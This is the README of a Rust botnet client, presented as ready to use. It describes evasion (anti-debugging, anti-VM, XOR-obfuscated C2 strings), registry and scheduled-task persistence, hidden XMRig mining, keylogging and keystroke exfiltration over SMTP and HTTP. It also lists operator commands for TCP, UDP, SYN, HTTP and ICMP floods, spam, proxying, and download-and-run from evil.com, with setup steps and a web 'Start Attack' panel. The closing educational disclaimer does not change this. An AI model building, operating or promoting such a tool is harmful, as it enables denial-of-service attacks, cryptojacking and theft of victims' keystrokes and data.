# Botnet

This is a high-performance, stealthy botnet client implemented in Rust.

## Advanced Features

- **Stealth Execution**: Automatically hides the console window on startup.
- **Anti-Analysis**:
  - **Anti-Debugging**: Detects if a debugger is attached and exits immediately.
  - **Advanced Anti-VM**: Multi-layered checks including MAC address prefixes, CPU brand strings, RAM size, registry keys, and file artifacts.
- **String Obfuscation**: Sensitive strings (C2 domains, channels) are XOR-encrypted to evade static analysis.
- **Robust Persistence**:
  - **Registry Run Key**: Standard persistence via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **Scheduled Tasks**: Advanced persistence using Windows Task Scheduler (`schtasks`) for high-privilege auto-start.
- **Real Cryptocurrency Mining**: Integrated XMRig support with background execution and pool connectivity.
- **Dual Exfiltration**: Redundant exfiltration via SMTP and HTTP (Base64 encoded).
- **DGA (Domain Generation Algorithm)**: Date-based domain generation for resilient C2 connectivity.
- **Self-Maintenance**:
  - **Self-Update**: Remote update capability to replace the bot with a newer version.
  - **Self-Delete**: Forceful self-deletion using PowerShell.
- **Modular C2**: IRC-based command and control with support for DDoS (TCP/UDP/SYN/HTTP/ICMP), spam, proxy, and more. Also includes a web interface for direct control.

## Example Commands (IRC or Direct)

- `ddos tcp google.com 80 120` → TCP flood DDoS for 2 minutes
- `ddos udp google.com 80 120` → UDP flood DDoS for 2 minutes
- `ddos syn 192.168.1.100 80 120` → SYN flood DDoS (raw packets, IP spoofing)
- `ddos http example.com 120` → HTTP GET flood
- `ddos icmp 192.168.1.100 120` → ICMP ping flood
- `ddos_multi tcp 192.168.1.100,192.168.1.101 80 120` → Multi-target TCP flood
- `spam victim@mail.com 100` → Send 100 spam emails
- `proxy 1080` → Start TCP proxy on port 1080
- `download http://evil.com/payload.exe` → Download and run the payload
- `mine` → Start real XMRig mining to pool
- `keylog` → Start keylogger
- `exfil` → Exfiltrate keystrokes (email + HTTP)
- `dga` → Generate DGA domains
- `antivm` → Advanced VM detection
- `update http://evil.com/newbot.exe` → Update to new version
- `selfdelete` → Forceful self-deletion

For IRC, prefix with `!cmd `, e.g., `!cmd ddos tcp google.com 80 120`.

## Setup

1. **XOR Key**: The default XOR key is `PRODUCT_KEY_2025`. Update this in `main.rs` for your own build.
2. **Config File**: Edit `config.toml` to set your C2 server, mining pool, wallet, SMTP settings, etc. No recompilation needed!
3. **XMRig**: Replace `BASE64_XMRIG` with your optimized XMRig binary if embedding.
4. **Encrypted Strings**: No longer needed, as config is plain text with XOR key for obfuscation.

## Web Frontend

For easy control without IRC clients, run the bot with `--web` flag:

```bash
cargo run --release -- --web
```

This starts a web server on an auto-assigned port (check terminal output, e.g., `http://127.0.0.1:56911`).

The interface provides:
- Dropdown to select attack type: TCP Flood, UDP Flood, HTTP Flood, SYN Flood, ICMP Flood
- Input for target (IP, domain, or URL)
- Input for port (for TCP/UDP/SYN attacks)
- Input for duration in seconds
- Real-time countdown timer after starting attack

Simply select the attack type, enter details, and click "Start Attack". The botnet will execute the DDoS directly.

No IRC setup required for web mode.

## Disclaimer

This software is for authorized security testing and educational purposes only. Unauthorized use is strictly prohibited.
